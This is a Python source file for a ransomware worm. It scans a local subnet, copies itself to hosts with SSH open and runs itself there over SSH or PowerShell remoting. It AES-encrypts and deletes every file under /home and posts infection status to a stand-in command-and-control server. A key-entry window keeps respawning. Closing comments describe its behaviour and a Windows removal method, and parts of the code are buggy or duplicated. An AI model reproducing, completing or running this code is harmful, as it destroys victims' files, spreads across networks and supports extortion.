import os
import sys
import socket
import subprocess
import platform
import shutil
import requests
import logging
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from tkinter import Tk, Label, Entry, Button, StringVar, messagebox
import psutil
import time

# AES key for encryption and decryption (In practice, never hardcode keys)
encryption_key = b'thisisthesecretkeythatwillbeused'

def initialize():
    # Set up logging
    logging.basicConfig(filename='worm.log', level=logging.INFO, format='%(asctime)s %(message)s')
    logging.info('Script initialized.')

    # Determine PID file path based on OS
    if os.name == 'nt':  # Windows
        pidfile = os.path.join(os.getenv('TEMP'), 'script.pid')
    else:  # Unix-like (Linux, macOS)
        pidfile = "/tmp/script.pid"

    pid = str(os.getpid())

    # Check if the script is already running
    if os.path.isfile(pidfile):
        with open(pidfile, 'r') as f:
            existing_pid = f.read().strip()
        try:
            # Check if the existing process is still running
            if os.name == 'nt':
                # Windows: Use tasklist command to check if process is running
                result = os.system(f'tasklist /FI "PID eq {existing_pid}" 2>NUL | find /I "{existing_pid}" >NUL')
                if result == 0:
                    logging.warning("Script is already running, exiting.")
                    sys.exit()
            else:
                # Unix-like: Use kill -0 to check if process is running
                os.kill(int(existing_pid), 0)
                logging.warning("Script is already running, exiting.")
                sys.exit()
        except (OSError, ProcessLookupError):
            # Process not found, we can proceed
            pass

    with open(pidfile, 'w') as f:
        f.write(pid)
    logging.info(f"Script started with PID: {pid}")

def scan_network():
    targets = []
    # Scan local network for targets
    for ip in range(1, 255):
        target_ip = f"192.168.1.{ip}"
        if is_host_alive(target_ip):
            targets.append(target_ip)
    return targets

def is_host_alive(ip):
    # Check if host is alive (ping or similar method)
    response = os.system(f"ping -c 1 {ip}" if os.name != 'nt' else f"ping -n 1 {ip}")
    return response == 0

def exploit_target(target_ip):
    # Exploit the target (placeholder for actual exploit code)
    if check_vulnerability(target_ip):
        return True
    return False

def check_vulnerability(ip):
    # Check for specific vulnerabilities (placeholder logic)
    logging.info(f"Checking vulnerabilities for {ip}")
    try:
        socket.create_connection((ip, 22), timeout=5)  # Check if SSH port is open
        logging.info(f"Vulnerability found on {ip}")
        return True
    except Exception as e:
        logging.info(f"No vulnerability found on {ip}: {e}")

        return False

def replicate(target_ip, target_user, target_password=None):
    try:
        if platform.system() == "Windows":
            target_path = f"\\\\{target_ip}\\shared_folder\\script.py"
        else:
            target_path = f"/shared_folder/script.py"

        # Copy the script to the target system
        shutil.copy(__file__, target_path)

        # Execute the script on the target system
        if platform.system() == "Windows":
            # Use PowerShell for Windows remote execution
            subprocess.run(["powershell", f"Invoke-Command -ComputerName {target_ip} -ScriptBlock {{ python {target_path} }}"])
        else:
            # Use SSH for Unix-like systems
            subprocess.run(["ssh", f"{target_user}@{target_ip}", f"python3 {target_path}"])

        logging.info(f"Replicated to {target_ip}")
    except Exception as e:
        logging.error(f"Failed to replicate to {target_ip}: {e}")

def encrypt_files():
    for root, dirs, files in os.walk('/home'):
        for file in files:
            file_path = os.path.join(root, file)
            if not os.path.isdir(file_path):
                try:
                    with open(file_path, 'rb') as f:
                        data = f.read()

                    cipher = AES.new(encryption_key, AES.MODE_GCM)
                    nonce = cipher.nonce
                    ciphertext, tag = cipher.encrypt_and_digest(data)

                    with open(file_path + '.enc', 'wb') as f:
                        f.write(nonce)
                        f.write(tag)
                        f.write(ciphertext)

                    os.remove(file_path)
                    logging.info(f"Encrypted {file_path}")
                except Exception as e:
                    logging.error(f"Failed to encrypt {file_path}: {e}")

def decrypt_files(key):
    for root, dirs, files in os.walk('/home'):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path.endswith('.enc'):
                try:
                    with open(file_path, 'rb') as f:
                        encrypted_data = f.read()

                    nonce = encrypted_data[:16]
                    tag = encrypted_data[16:32]
                    ciphertext = encrypted_data[32:]

                    cipher = AES.new(key.encode(), AES.MODE_GCM, nonce=nonce)
                    original_data = cipher.decrypt_and_verify(ciphertext, tag)

                    with open(file_path[:-4], 'wb') as f:
                        f.write(unpad(original_data, AES.block_size))

                    os.remove(file_path)
                    logging.info(f"Decrypted {file_path}")
                except Exception as e:
                    logging.error(f"Failed to decrypt {file_path}: {e}")

def execute_payload(action):
    if action == "encrypt":
        encrypt_files()
    else:
        logging.error("Invalid action specified")

def command_and_control():
    url = "http://attacker_server.com/report"
    data = {"status": "infected", "host": socket.gethostname()}
    try:
        requests.post(url, json=data)
        logging.info(f"Reported to C2 server: {data}")
    except Exception as e:
        logging.error(f"Failed to communicate with C2 server: {e}")

def show_lock_bar(decryption_key):
    def check_key():
        user_key = key_var.get()
        if user_key == decryption_key:
            messagebox.showinfo("Success", "Correct key! Decrypting files...")
            root.destroy()
            decrypt_files(user_key)
            self_destruct()
        else:
            messagebox.showerror("Error", "Incorrect key. Try again.")

    root = Tk()
    root.title("Enter Decryption Key")
    root.geometry("300x150")

    Label(root, text="Enter Decryption Key:").pack(pady=10)
    key_var = StringVar()
    Entry(root, textvariable=key_var, show="*").pack(pady=5)
    Button(root, text="Submit", command=check_key).pack(pady=10)

    root.mainloop()

def self_destruct():
    try:
        file_path = __file__
        os.remove(file_path)
        logging.info(f"{file_path} has been deleted.")
    except Exception as e:
        logging.error(f"Failed to delete {file_path}: {e}")

def monitor_and_restart(exe_path, process_name, decryption_key):
    def is_process_running(process_name):
        # Check if a process is running based on the platform
        if platform.system() == 'Windows':
            # Windows-specific logic
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == process_name:
                    return True
        else:
            # Unix-like systems logic
            try:
                # Check if any process with the given name is running
                result = subprocess.run(['pgrep', '-f', process_name], stdout=subprocess.PIPE)
                if result.returncode == 0:
                    return True
            except Exception as e:
                logging.error(f"Failed to check process on Unix-like system: {e}")
        return False

    def auto_restart_process(exe_path):
        # Start the process and return the process object
        process = subprocess.Popen([sys.executable, exe_path])
        logging.info(f"Started process {exe_path} with PID {process.pid}")
        return process

    process = auto_restart_process(exe_path)
    try:
        while True:
            if not is_process_running(process_name):
                logging.info(f"Process {process_name} terminated. Restarting...")
                process = auto_restart_process(exe_path)
            time.sleep(1)  # Check every second

            # If the process is running, show the lock bar
            show_lock_bar(decryption_key)
            break
    except KeyboardInterrupt:
        logging.info("Monitoring stopped by user.")

def show_lock_bar(decryption_key):
    from tkinter import Tk, Label, Entry, Button, StringVar, messagebox

    def check_key():
        user_key = key_var.get()
        if user_key == decryption_key:
            messagebox.showinfo("Success", "Correct key! Decrypting files...")
            root.destroy()
            decrypt_files(user_key)
            self_destruct()
        else:
            messagebox.showerror("Error", "Incorrect key. Try again.")

    root = Tk()
    root.title("Enter Decryption Key")
    root.geometry("300x150")

    Label(root, text="Enter Decryption Key:").pack(pady=10)
    key_var = StringVar()
    Entry(root, textvariable=key_var, show="*").pack(pady=5)
    Button(root, text="Submit", command=check_key).pack(pady=10)

    root.mainloop()

def main():
    initialize()
    execute_payload('encrypt')
    targets = scan_network()
    for target in targets:
        if exploit_target(target):
            replicate(target, target_user='username', target_password='password')  # Modify as needed
            execute_payload('encrypt')
    command_and_control()

if __name__ == "__main__":
    logging.basicConfig(filename='worm.log', level=logging.INFO, format='%(asctime)s %(message)s')
    exe_path = sys.argv[0]
    process_name = os.path.basename(sys.argv[0])
    decryption_key = 'your_decryption_key_here'  # Replace with the actual decryption key
    monitor_and_restart(exe_path, process_name, decryption_key)

'''
I couldn't make it as well as I wanted but still it works terribly in .exe form
run by me in .exe form without creating any other enviornment, stay away from this!

::Malware behavior::
It will continuously(approximate 1 in a sec) create new messagebox and ask for decryption_key
It will continue, as the program check and re-run in every second you cann't delete it

if you run this as .exe form to remove this malware you can use this technique
you can't stop this from task manager

To remove this malware(windows system)
Goto run by 🪟+r
>> type "mrt"(Malicious software Removal Tool) without quotation
>> Yes
>> Next
>> select >> Quick scan >> next

or you can scan from virus and threat protection

01/07/2024 approximate 12:30
'''
